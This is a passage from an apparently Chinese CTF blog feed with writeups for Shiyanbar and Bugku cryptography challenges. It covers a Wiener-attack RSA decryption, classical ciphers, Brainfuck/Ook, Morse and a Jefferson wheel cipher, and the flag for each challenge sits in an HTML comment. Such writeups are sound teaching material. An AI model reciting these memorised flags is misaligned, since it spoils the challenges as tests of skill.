RSA.importKey(open(<span class="string">'warmup.pub'</span>).read())</span><br><span class="line">n = long(pub.n)</span><br><span class="line">e = long(pub.e)</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line"><span class="keyword">print</span> e</span><br></pre></td></tr></table></figure></p><p>n特别大，所以分解是不可能分解的，用<a href="https://github.com/pablocelayes/rsa-wiener-attack" target="_blank" rel="noopener">rsa-wiener-attack</a>得到d<br>修改<code>RSAwienerHacker.py</code>中的代码↓<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Crypto/15-01.png" alt="" title="" class="">                <p></p>            </figure><br>python2和3都可以跑，运行得到d<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Crypto/15-02.png" alt="" title="" class="">                <p></p>            </figure><br>有了d就可以解密了<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">n = <span class="number">0x367198D6B5614E95813ADD8F22A4717BC72BE1EABD933D1B86944FDB75B8ED230BE62D7D1B69D222095C128C86F82012ECB116191FD9D018A6D02F84DB27BC51A21307DC86F4BF771C691C143E5ABE549B5BD2D6EB1A21FD6270E7E1B48FE0611FBB2E1B0B3524E6F4DE8B4E4A345DA44A13DE825B72608DB6C7C4A40B78266E6C87BBFDEF6B48381D49C4507A58BCD47B76D64B45908B158BD7EBC4DACB0B1CFD6C2C19574F40EB2EFD0E9E10DC7005CAD39BCAF52B9EAC3873368D69031C5E724684A44F068EFD1D3DC096D9B5D6411E58BDEE43E46B99A0D0494B9DB28195AF901AFF130D4A6E203DAD08DA57FA7E40262A5BADB2A323EDA28B44696AB305D</span></span><br><span class="line">d = <span class="number">4221909016509078129201801236879446760697885220928506696150646938237440992746683409881141451831939190609743447676525325543963362353923989076199470515758399</span></span><br><span class="line">c = <span class="number">0x1e04304936215de8e21965cfca9c245b1a8f38339875d36779c0f123c475bc24d5eef50e7d9ff5830e80c62e8083ec55f27456c80b0ab26546b9aeb8af30e82b650690a2ed7ea407dcd094ab9c9d3d25a93b2140dcebae1814610302896e67f3ae37d108cd029fae6362ea7ac1168974c1a747ec9173799e1107e7a56d783660418ebdf6898d7037cea25867093216c2c702ef3eef71f694a6063f5f0f1179c8a2afe9898ae8dec5bb393cdffa3a52a297cd96d1ea602309ecf47cd009829b44ed3100cf6194510c53c25ca7435f60ce5f4f614cdd2c63756093b848a70aade002d6bc8f316c9e5503f32d39a56193d1d92b697b48f5aa43417631846824b5e86</span></span><br><span class="line"></span><br><span class="line">m = hex(pow(c, d, n)).rstrip(<span class="string">"L"</span>)</span><br><span class="line"><span class="comment"># print(m)</span></span><br><span class="line">print(str(unhexlify(m[<span class="number">2</span>:]),encoding=<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure></p><!--BCTF{9etRea4y!}--><h1 id="密文-rot13"><a href="#密文-rot13" class="headerlink" title="密文 rot13"></a>密文 rot13</h1><p>rot13:<a href="http://ctf.ssleye.com/rot13.html" target="_blank" rel="noopener">在线解密</a><br>格式大写<br><!--57E9F980EABF49973F757CDB9F80D36C--></p><h1 id="keyboard"><a href="#keyboard" class="headerlink" title="keyboard"></a>keyboard</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BHUK,LP TGBNHGYT BHUK,LP UYGBN TGBNHGYT BHUK,LP BHUK,LP TGBNHGYT BHUK,LP TGBNHGYT UYGBN</span><br></pre></td></tr></table></figure><p>提示很明显，BHUK,LP按顺序连起来为‘N’，同理得到flag，注意格式大写<br><!--NBNCBNNBNBC--></p><h1 id="一个img文件"><a href="#一个img文件" class="headerlink" title="一个img文件"></a>一个img文件</h1><p>参考：<a href="https://blog.csdn.net/dongyanwen6036/article/details/77113891" target="_blank" rel="noopener">一个img文件-实验吧</a><br><!--flag{245d734b559c6b084b7ecb40596055243e8afdd2}--></p><h1 id="数码管"><a href="#数码管" class="headerlink" title="数码管"></a>数码管</h1><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Crypto/18-02.png" alt="" title="" class="">                <p></p>            </figure><p>图片字符为：HELLO，对表解密，红色共阳极，蓝色共阴极，共阴极二进制值取反<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Crypto/18-01.png" alt="" title="" class="">                <p></p>            </figure><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">H -&gt; 89</span><br><span class="line">E -&gt; 86 -&gt; ‭‭10000110‬‬ -&gt; 01111001 -&gt; ‭79‬</span><br><span class="line">L -&gt; C7</span><br><span class="line">L -&gt; C7 -&gt; ‭11000111‬ -&gt; 00111000 -&gt; ‭38‬</span><br><span class="line">O -&gt; C0</span><br></pre></td></tr></table></figure></p><!--DUTCTF{8979C738C0}--><h1 id="古典密码的安全性不高，但仍然十分美妙，请破译下面的密文"><a href="#古典密码的安全性不高，但仍然十分美妙，请破译下面的密文" class="headerlink" title="古典密码的安全性不高，但仍然十分美妙，请破译下面的密文"></a>古典密码的安全性不高，但仍然十分美妙，请破译下面的密文</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Os drnuzearyuwn, y jtkjzoztzoes douwlr oj y ilzwex eq lsdexosa kn pwodw tsozj eq ufyoszlbz yrl rlufydlx pozw douwlrzlbz, ydderxosa ze y rlatfyr jnjzli; mjy gfbmw vla xy wbfnsy symmyew (mjy vrwm qrvvrf), hlbew rd symmyew, mebhsymw rd symmyew, vbomgeyw rd mjy lxrzy, lfk wr dremj. Mjy eyqybzye kyqbhjyew mjy myom xa hyedrevbfn lf bfzyewy wgxwmbmgmbrf. Wr mjy dsln bw f1_2jyf-k3_jg1-vb-vl_l</span><br></pre></td></tr></table></figure><p>词频分析：<a href="https://quipqiup.com/" target="_blank" rel="noopener">https://quipqiup.com/</a><br><!--n1_2hen-d3_hu1-mi-ma_a--></p><h1 id="最近在论证一个问题，到底是先有鸡还是先有蛋"><a href="#最近在论证一个问题，到底是先有鸡还是先有蛋" class="headerlink" title="最近在论证一个问题，到底是先有鸡还是先有蛋"></a>最近在论证一个问题，到底是先有鸡还是先有蛋</h1><p>Ijm,lo 3wsdr4 6tghu7<br>键盘圈<br><!--KEY--></p><h1 id="压缩的问题"><a href="#压缩的问题" class="headerlink" title="压缩的问题"></a>压缩的问题</h1><p>将16进制字符串用winhex写入文件<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Crypto/17-01.png" alt="" title="" class="">                <p></p>            </figure><br>可以看到是rar文件，解压需要密码，再次审题看到提示↓，这一段的值为密码<br><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Shiyanbar/Crypto/17-02.png" alt="" title="" class="">                <p></p>            </figure><br>最后计算哈希的前8位sha1值，小写为flag<br><!--58a09ae4--></p><h1 id="chinese-hacker"><a href="#chinese-hacker" class="headerlink" title="chinese hacker"></a>chinese hacker</h1><p>下载数据库，用数据库查看器打开看到<code>INXW2ZLPNYZDAMJSMJQWE6I=</code><br>直接提交code1得到前半个flag<code>1GetThEFirst</code><br>在将值<code>INXW2ZLPNYZDAMJSMJQWE6I=</code>base32解码得到<code>Comeon2012baby</code><br>提交得到后半个flag<code>2tHEWinNer</code><br><!--1GetThEFirst2tHEWinNer--></p><h1 id="这里没有key"><a href="#这里没有key" class="headerlink" title="这里没有key"></a>这里没有key</h1><p>查看源码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>大家好<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Type"</span> <span class="attr">content</span>=<span class="string">"text/html; charset=Utf-8"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">alert(<span class="string">"这里没有key"</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- #@~^TgAAAA=='[6*liLa6++p'aXvfiLaa6i[[avWi[[a*p[[6*!I'[6cp'aXvXILa6fp[:6+Wp[:XvWi[[6+XivRIAAA==^#~@ --&gt;</span></span><br></pre></td></tr></table></figure></p><p>asp解码后html解码得到flag</p><p style="display:none;">Encode@decode</p><h1 id="敌军情报"><a href="#敌军情报" class="headerlink" title="敌军情报"></a>敌军情报</h1><p> 知彼知己方能百战不殆。天枢战队成员截获了一条命令密文45 46 45 46 32 45 32 46 46 45 46 32 46 45 32，你能解密成明文，做到知己知彼吗？<br>格式：CTF{ }<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">45 46 45 46 32 45 32 46 46 45 46 32 46 45 32</span><br><span class="line">ascii,32为空格</span><br><span class="line">- . - .   -   . . - .   . -</span><br><span class="line">根据莫斯密码表</span><br><span class="line">- . - .    C</span><br><span class="line">   -   T</span><br><span class="line">. . - .F</span><br><span class="line">  . -  A</span><br></pre></td></tr></table></figure></p><!--CTF{a}--><p><br><br><br></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实验吧 </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Bugku-Crypto-writeup</title>
      <link href="/2018/05/07/Bugku-Crypto-writeup/"/>
      <url>/2018/05/07/Bugku-Crypto-writeup/</url>
      <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>Bugku密码学题目writeup</p></blockquote><a id="more"></a><h1 id="滴答-滴"><a href="#滴答-滴" class="headerlink" title="滴答~滴"></a>滴答~滴</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-... -.- -.-. - ..-. -- .. ... -.-.</span><br></pre></td></tr></table></figure><p>答案格式KEY{xxxxxxxxx}</p><p>摩斯电码<br>BKCTFMISC<br><!--KEY{BKCTFMISC}--></p><h1 id="聪明的小羊"><a href="#聪明的小羊" class="headerlink" title="聪明的小羊"></a>聪明的小羊</h1><p>一只小羊翻过了2个栅栏<br>KYsd3js2E{a2jda}</p><p>栅栏密码<br>KYsd3js2<br>E{a2jda}<br><!--KEY{sad23jjdsa2}--></p><h1 id="ok"><a href="#ok" class="headerlink" title="ok"></a>ok</h1><p>在以下网址中解密<br><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a><br><!--flag{ok-ctf-1234-admin}--></p><h1 id="这不是摩斯密码"><a href="#这不是摩斯密码" class="headerlink" title="这不是摩斯密码"></a>这不是摩斯密码</h1><p>下载看看吧</p><p>1.txt的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++[- &gt;---&lt; ]&gt;--- .---- .&lt;+++ ++++[ -&gt;--- ----&lt;</span><br><span class="line">]&gt;--- ----- ----- .&lt;+++ ++++[ -&gt;+++ ++++&lt; ]&gt;+++ ++.&lt;+ +++++ +[-&gt;- -----</span><br><span class="line">-&lt;]&gt;. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ .&lt;+++ [-&gt;-- -&lt;]&gt;- ----. &lt;++++ +++[-</span><br><span class="line">&gt;---- ---&lt;] &gt;---- ----. +++++ +..++ +++.+ .&lt;+++ [-&gt;-- -&lt;]&gt;- --.&lt;+ +++++</span><br><span class="line">+[-&gt;+ +++++ +&lt;]&gt;+ ++.++ +.+++ +++++ +.--- -.+++ ++.&lt;+ ++[-&gt; +++&lt;] &gt;++++</span><br><span class="line">++.&lt;</span><br></pre></td></tr></table></figure></p><p>在以下网址中解密<br><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a><br><!--flag{ok-c2tf-3389-admin}--></p><h1 id="简单加密"><a href="#简单加密" class="headerlink" title="简单加密"></a>简单加密</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA</span><br></pre></td></tr></table></figure><p>凯撒，用python跑一下<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str = <span class="string">"e6Z9i~]8R~U~QHE&#123;RnY&#123;QXg~QnQ&#123;^XVlRXlp^XI5Q6Q6SKY8jUAA"</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> range(<span class="number">127</span>):</span><br><span class="line">    key = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">        temp = chr((ord(i)+a)%<span class="number">127</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="number">32</span>&lt;ord(temp)&lt;<span class="number">127</span>:</span><br><span class="line">            key = key + temp</span><br><span class="line">            feel = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            feel = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> feel == <span class="number">1</span>:</span><br><span class="line">        print(key)</span><br></pre></td></tr></table></figure></p><p>a2V5ezY4NzQzMDAwNjUwMTczMjMwZTRhNThlZTE1M2M2OGU4fQ==<br>base64解码得到flag<br><!--key{68743000650173230e4a58ee153c68e8}--></p><h1 id="散乱的密文"><a href="#散乱的密文" class="headerlink" title="散乱的密文"></a>散乱的密文</h1><p>lf5{ag024c483549d7fd@@1}<br>一张纸条上凌乱的写着2 1 6 5 3 4</p><table><thead><tr><th>2</th><th>1</th><th>6</th><th>5</th><th>3</th><th>4</th></tr></thead><tbody><tr><td>l</td><td>f</td><td>5</td><td>{</td><td>a</td><td>g </td></tr><tr><td>0</td><td>2</td><td>4</td><td>c</td><td>4</td><td>8</td></tr><tr><td>3</td><td>5</td><td>4</td><td>9</td><td>d</td><td>7</td></tr><tr><td>f</td><td>d</td><td>@</td><td>@</td><td>1</td><td>}</td></tr></tbody></table><p>按照顺序读下来<code>f25dl03fa4d1g87}{c9@544@</code><br>栅栏解密得到<code>flag{52048c453d794df1}@@</code>，格式flag{}，去掉@@<br><!--flag{52048c453d794df1}--></p><h1 id="凯撒部长的奖励"><a href="#凯撒部长的奖励" class="headerlink" title="凯撒部长的奖励"></a>凯撒部长的奖励</h1><p>凯撒密码，MSW=SYC，<a href="https://quipqiup.com/" target="_blank" rel="noopener">词频分析</a><br><!--SYC{here_Is_yOur_rEwArd_enjOy_It_Caesar_or_call_him_vIctOr_is_a_Excellent_man_if_you_want_to_get_his_informations_you_can_join_us}--></p><h1 id="一段base64"><a href="#一段base64" class="headerlink" title="一段base64"></a>一段base64</h1><p>使用编码工具Converter，将文本内容复制进去<br>按照以下次序解码base64、Unescape、Hex to Text、Unescape（只要括号内的参数）、Dec to Text、Decode HTML。最后得到Unicode编码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#37;&amp;#55;&amp;#66;&amp;#99;&amp;#116;&amp;#102;&amp;#95;&amp;#116;&amp;#102;&amp;#99;&amp;#50;&amp;#48;&amp;#49;&amp;#55;&amp;#49;&amp;#55;&amp;#113;&amp;#119;&amp;#101;&amp;#37;&amp;#55;&amp;#68;</span><br></pre></td></tr></table></figure></p><figure class="image-box">                <img src="https://bp.yuanlichenai.cn/Bugku/Crypto/06-01.png" alt="" title="" class="">                <p></p>            </figure><p>最后url解码得到flag(手动解码*^▽^*：”%7B”=”{“,”%7D”=”}”)<br><!--flag{ctf_tfc201717qwe}--></p><h1 id=""><a href="#" class="headerlink" title=".!?"></a>.!?</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">..... ..... ..... ..... !?!!. ?.... ..... ..... ..... .?.?! .?... .!...</span><br><span class="line">..... ..... !.?.. ..... !?!!. ?!!!! !!?.? !.?!! !!!.. ..... ..... .!.?.</span><br><span class="line">..... ...!? !!.?. ..... ..?.? !.?.. ..... .!.?. ..... ..... !?!!. ?!!!!</span><br><span class="line">!!!!! !?.?! .?!.? ..... ....! ?!!.? ..... ...?. ?!.?. ..... !.?.. .....</span><br><span class="line">!?!!. ?!!!! !!?.? !.?!! !!!!! !!!!. ..... ...!. ?.... ...!? !!.?. .....</span><br><span class="line">?.?!. ?..!. ?.... ..... !?!!. ?!!!! !!!!? .?!.? !!!!! !!!!! !!!.? .....</span><br><span class="line">..!?! !.?.. ....? .?!.? ....! .!!!. !!!!! !!!!! !!!!! !!.?. ..... .!?!!</span><br><span class="line">.?... ...?. ?!.?. ..... !.!!! !!!!! !.?.. ..... ..!?! !.?.. ..... .?.?!</span><br><span class="line">.?... ..... !.?.</span><br></pre></td></tr></table></figure><p>Ook短加密，解密地址<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a><br><!--flag{bugku_jiami}--></p><h1 id="-1"><a href="#-1" class="headerlink" title="+[]-"></a>+[]-</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++.+ +++++ .&lt;+++ [-&gt;-- -&lt;]&gt;- -.+++ +++.&lt;</span><br><span class="line">++++[ -&gt;+++ +&lt;]&gt;+ +++.&lt; +++++ [-&gt;-- ---&lt;] &gt;.&lt;++ ++[-&gt; ++++&lt; ]&gt;+++ .&lt;+++</span><br><span class="line">[-&gt;-- -&lt;]&gt;- ----. ++++. &lt;+++[ -&gt;+++ &lt;]&gt;+. &lt;++++ [-&gt;-- --&lt;]&gt; ----- -.&lt;++</span><br><span class="line">+[-&gt;+ ++&lt;]&gt; ++.-. ----- ---.&lt; +++[- &gt;+++&lt; ]&gt;+++ .---- .&lt;+++ [-&gt;-- -&lt;]&gt;-</span><br><span class="line">.&lt;+++ +++[- &gt;---- --&lt;]&gt; ----- ----. +.&lt;++ +++++ +[-&gt;+ +++++ ++&lt;]&gt; +++++</span><br><span class="line">+++++ .&lt;</span><br></pre></td></tr></table></figure><p>在以下网址中解密<br><a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a><br><!--flag{bugku_jiami_23}--></p><h1 id="突然天上一道雷电"><a href="#突然天上一道雷电" class="headerlink" title="突然天上一道雷电"></a>突然天上一道雷电</h1><p>gndk€rlqhmtkwwp}z<br>变异凯撒，gndk=flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">list = <span class="string">'gndk€rlqhmtkwwp&#125;z'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list:</span><br><span class="line">    a = ord(i)</span><br><span class="line">    a -= num</span><br><span class="line">    flag += chr(a)</span><br><span class="line">    num +=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p><!--flag{lei_ci_jiami}--><h1 id="托马斯-杰斐逊"><a href="#托马斯-杰斐逊" class="headerlink" title="托马斯.杰斐逊"></a>托马斯.杰斐逊</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">1： &lt;ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;</span><br><span class="line">2： &lt;KPBELNACZDTRXMJQOYHGVSFUWI &lt;</span><br><span class="line">3： &lt;BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;</span><br><span class="line">4： &lt;RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;</span><br><span class="line">5： &lt;IHFRLABEUOTSGJVDKCPMNZQWXY &lt;</span><br><span class="line">6： &lt;AMKGHIWPNYCJBFZDRUSLOQXVET &lt;</span><br><span class="line">7： &lt;GWTHSPYBXIZULVKMRAFDCEONJQ &lt;</span><br><span class="line">8： &lt;NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;</span><br><span class="line">9： &lt;QWATDSRFHENYVUBMCOIKZGJXPL &lt;</span><br><span class="line">10： &lt;WABMCXPLTDSRJQZGOIKFHENYVU &lt;</span><br><span class="line">11： &lt;XPLTDAOIKFZGHENYSRUBMCQWVJ &lt;</span><br><span class="line">12： &lt;TDSWAYXPLVUBOIKZGJRFHENMCQ &lt;</span><br><span class="line">13： &lt;BMCSRFHLTDENQWAOXPYVUIKZGJ &lt;</span><br><span class="line">14： &lt;XPHKZGJTDSENYVUBMLAOIRFCQW &lt;</span><br><span class="line"></span><br><span class="line">密钥： 2,5,1,3,6,4,9,7,8,14,10,13,11,12</span><br><span class="line">密文：HCBTSXWCRQGLES</span><br><span class="line">flag格式 flag&#123;你解密的内容&#125;</span><br></pre></td></tr></table></figure><p>看了下<a href="https://www.iotaa.cn/?p=338" target="_blank" rel="noopener">王心慰的博客</a>了解了下思路<br>先根据秘钥所提供的行号重新排序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">KPBELNACZDTRXMJQOYHGVSFUWI</span><br><span class="line">IHFRLABEUOTSGJVDKCPMNZQWXY</span><br><span class="line">ZWAXJGDLUBVIQHKYPNTCRMOSFE</span><br><span class="line">BDMAIZVRNSJUWFHTEQGYXPLOCK</span><br><span class="line">AMKGHIWPNYCJBFZDRUSLOQXVET</span><br><span class="line">RPLNDVHGFCUKTEBSXQYIZMJWAO</span><br><span class="line">QWATDSRFHENYVUBMCOIKZGJXPL</span><br><span class="line">GWTHSPYBXIZULVKMRAFDCEONJQ</span><br><span class="line">NOZUTWDCVRJLXKISEFAPMYGHBQ</span><br><span class="line">XPHKZGJTDSENYVUBMLAOIRFCQW</span><br><span class="line">WABMCXPLTDSRJQZGOIKFHENYVU</span><br><span class="line">BMCSRFHLTDENQWAOXPYVUIKZGJ</span><br><span class="line">XPLTDAOIKFZGHENYSRUBMCQWVJ</span><br><span class="line">TDSWAYXPLVUBOIKZGJRFHENMCQ</span><br></pre></td></tr></table></figure></p><p>然后将密文的字母移动到第一列<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HGVSFUWIKPBELNACZDTRXMJQOY</span><br><span class="line">CPMNZQWXYIHFRLABEUOTSGJVDK</span><br><span class="line">BVIQHKYPNTCRMOSFEZWAXJGDLU</span><br><span class="line">TEQGYXPLOCKBDMAIZVRNSJUWFH</span><br><span class="line">SLOQXVETAMKGHIWPNYCJBFZDRU</span><br><span class="line">XQYIZMJWAORPLNDVHGFCUKTEBS</span><br><span class="line">WATDSRFHENYVUBMCOIKZGJXPLQ</span><br><span class="line">CEONJQGWTHSPYBXIZULVKMRAFD</span><br><span class="line">RJLXKISEFAPMYGHBQNOZUTWDCV</span><br><span class="line">QWXPHKZGJTDSENYVUBMLAOIRFC</span><br><span class="line">GOIKFHENYVUWABMCXPLTDSRJQZ</span><br><span class="line">LTDENQWAOXPYVUIKZGJBMCSRFH</span><br><span class="line">ENYSRUBMCQWVJXPLTDAOIKFZGH</span><br><span class="line">SWAYXPLVUBOIKZGJRFHENMCQTD</span><br></pre></td></tr></table></figure></p><p>用脚本将每一列遍历出来，并找到特殊的句子即为flag<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">a =<span class="string">"""HGVSFUWIKPBELNACZDTRXMJQOY</span></span><br><span class="line"><span class="string">CPMNZQWXYIHFRLABEUOTSGJVDK</span></span><br><span class="line"><span class="string">BVIQHKYPNTCRMOSFEZWAXJGDLU</span></span><br><span class="line"><span class="string">TEQGYXPLOCKBDMAIZVRNSJUWFH</span></span><br><span class="line"><span class="string">SLOQXVETAMKGHIWPNYCJBFZDRU</span></span><br><span class="line"><span class="string">XQYIZMJWAORPLNDVHGFCUKTEBS</span></span><br><span class="line"><span class="string">WATDSRFHENYVUBMCOIKZGJXPLQ</span></span><br><span class="line"><span class="string">CEONJQGWTHSPYBXIZULVKMRAFD</span></span><br><span class="line"><span class="string">RJLXKISEFAPMYGHBQNOZUTWDCV</span></span><br><span class="line"><span class="string">QWXPHKZGJTDSENYVUBMLAOIRFC</span></span><br><span class="line"><span class="string">GOIKFHENYVUWABMCXPLTDSRJQZ</span></span><br><span class="line"><span class="string">LTDENQWAOXPYVUIKZGJBMCSRFH</span></span><br><span class="line"><span class="string">ENYSRUBMCQWVJXPLTDAOIKFZGH</span></span><br><span class="line"><span class="string">SWAYXPLVUBOIKZGJRFHENMCQTD"""</span></span><br><span class="line">b=<span class="string">"HCBTSXWCRQGLES"</span></span><br><span class="line">a=a.splitlines()</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(b)):</span><br><span class="line">        print(a[i][j],end=<span 